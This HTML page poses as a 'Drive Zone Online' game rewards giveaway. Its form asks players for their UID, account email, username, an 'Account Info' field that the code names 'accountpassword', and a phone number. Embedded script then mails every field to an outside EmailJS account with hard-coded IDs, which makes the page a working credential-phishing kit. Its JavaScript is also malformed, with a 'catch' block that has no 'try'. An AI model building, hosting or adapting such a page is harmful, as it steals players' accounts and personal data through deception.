<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Drive Zone Online Rewards</title>

<style>

body{
margin:0;
font-family:Arial,sans-serif;
background:#0f0f0f;
color:white;
}

header{
background:linear-gradient(90deg,#ff6600,#ff0000);
padding:20px;
text-align:center;
font-size:28px;
font-weight:bold;
}

.container{
max-width:700px;
margin:auto;
padding:20px;
}

.card{
background:#1a1a1a;
padding:25px;
border-radius:15px;
}

input,select,button{
width:100%;
padding:13px;
margin-top:10px;
margin-bottom:15px;
border:none;
border-radius:8px;
box-sizing:border-box;
}

input,select{
background:#2a2a2a;
color:white;
}

button{
background:#ff3300;
color:white;
cursor:pointer;
font-weight:bold;
}

button:hover{
background:#ff5500;
}

.notice{
font-size:13px;
color:#bbbbbb;
}

</style>
</head>

<body>

<header>
DRIVE ZONE ONLINE REWARDS
</header>

<div class="container">

<div class="card">

<form id="rewardForm">

<label>Drive Zone UID</label>

<input
type="text"
id="uid"
placeholder="Enter UID"
required>

<label>Ingame Account Mail ID</label>

<input
type="email"
id="email"
placeholder="Enter ingame account mail ID"
required>

<label>Ingame Username</label>

<input
type="text"
id="username"
placeholder="Enter ingame username"
required>

<label>Account Info</label>

<input
type="text"
id="accountpassword"
placeholder="Enter account info"
required>

<label>Indian Phone Number</label>

<input
type="tel"
id="phone"
placeholder="10 digit Indian number"
maxlength="10"
required>

<label>Select Reward</label>

<select id="reward" required>

<option value="">
Choose Reward
</option>

<option value="Free Skin">
Free Skin
</option>

<option value="DZO Trading Access">
DZO Trading Access
</option>

<option value="Free Car">
Free Car
</option>

</select>

<button type="submit">

Submit Verification

</button>

</form>

</div>

</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>

/* ✅ YOUR PUBLIC KEY */
emailjs.init("IlZtBG2WOaqIrvb3T");

document
.getElementById('rewardForm')
.addEventListener('submit', async function(e){

e.preventDefault();

/* ✅ TEST TEMPLATE PARAMS */
const requestElement =
document.getElementById('request');

const templateParams = {

uid:
document.getElementById('uid').value,

email:
document.getElementById('email').value,

username:
document.getElementById('username').value,

accountinfo:
document.getElementById('accountpassword').value,

phone:
document.getElementById('phone').value,

reward:
document.getElementById('reward').value,

request:
requestElement
? requestElement.value
: "None",

photo:
"Image Uploaded"

};

/* ✅ YOUR SERVICE + TEMPLATE IDs */
await emailjs.send(

"service_03gi2v9",

"template_bker0h9",

templateParams

);

alert(
"Verification submitted successfully!"
);

}
catch(error){

alert(
JSON.stringify(error)
);

console.log(error);

}

});

</script>

</body>
</html>
